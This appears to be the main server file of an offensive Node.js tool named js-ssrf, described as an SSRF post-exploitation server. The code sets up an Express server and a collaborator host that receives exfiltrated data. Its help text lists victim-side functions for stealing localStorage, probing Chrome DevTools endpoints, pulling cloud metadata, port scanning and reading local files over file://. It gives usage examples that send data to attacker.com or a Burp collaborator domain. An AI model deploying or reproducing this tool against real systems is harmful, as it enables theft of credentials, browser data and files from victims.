const express = require("express");
const bodyParser = require('body-parser');

// Parse command line arguments
function parseArgs() {
    const args = process.argv.slice(2);
    const config = {
        port: 2222,
        collaborator: null
    };

    for (let i = 0; i < args.length; i++) {
        switch (args[i]) {
            case '-c':
            case '--collaborator':
                config.collaborator = args[++i];
                break;
            case '-p':
            case '--port':
                config.port = parseInt(args[++i]);
                break;
            case '-h':
            case '--help':
                printHelp();
                process.exit(0);
        }
    }

    return config;
}

function printHelp() {
    console.log(`
js-ssrf - SSRF Post-Exploitation Server

Usage: node server.js [options]

Options:
  -c, --collaborator <url>   Collaborator server to receive exfiltrated data
                             (default: uses local /log endpoint)
  -p, --port <port>          Port to run server on (default: 2222)
  -h, --help                 Show this help message

Payload URL parameters:
  ?f=<functions>   Comma-separated list of functions to run on victim

Available functions:
  localStorage    - Steal browser localStorage
  chromeHeadless  - Scan for Chrome DevTools Protocol endpoints
  cdpExtract      - Extract data via CDP WebSocket (needs wsUrl param)
  browserInfo     - Get browser information
  cloudMetadata   - Fetch cloud provider metadata
  portScanner     - Scan local ports
  fileRead        - Read local files via file:// protocol
  fileList        - List directories via file:// protocol
  all             - Run all functions

Examples:
  node server.js -c attacker.com
  node server.js -c burp.oastify.com

  Victim URLs:
  https://server:2222/?f=localStorage,chromeHeadless
  https://server:2222/?f=all
  https://server:2222/?f=fileRead,fileList
`);
}

const config = parseArgs();

// Make config available to routes
const app = express();
app.locals.config = config;

app.use(bodyParser.urlencoded({extended: false}));
app.use(bodyParser.json());

// Load routes after config is set
const routes = require("./routes.js");
app.use(routes);

app.listen(config.port);

console.log(`
===========================================
  js-ssrf server running
===========================================
  URL:          http://127.0.0.1:${config.port}
  Collaborator: ${config.collaborator || 'local /log endpoint'}

  Payload: https://${config.collaborator || '127.0.0.1:' + config.port}/?f=<functions>
  Example: https://${config.collaborator || '127.0.0.1:' + config.port}/?f=all
===========================================
`);
